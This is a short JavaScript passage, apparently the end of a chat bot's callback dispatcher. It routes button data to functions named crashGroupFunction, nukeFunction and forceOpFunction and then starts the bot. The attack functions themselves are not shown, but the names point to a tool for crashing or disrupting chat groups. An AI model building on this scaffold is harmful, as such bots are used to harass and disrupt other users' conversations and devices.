        if (date.startsWith('send_crashgp_')) {
          crashGroupFunction(ctx, date);
        } else if (date.startsWith('send_crashgp2_')) {
          crashGroup2Function(ctx, date);
        } else if (date.startsWith('send_nuke_')) {
          nukeFunction(ctx, date);
        } else if (date.startsWith('send_nuke2_')) {
          nuke2Function(ctx, date);
        } else if (date.startsWith('send_forceop_')) {
          forceOpFunction(ctx, date);
        }
        break;
    }

  } catch (e) {
    console.log(e)
  }
});

setTimeout(() => {
  bot.start();
}, 5000);


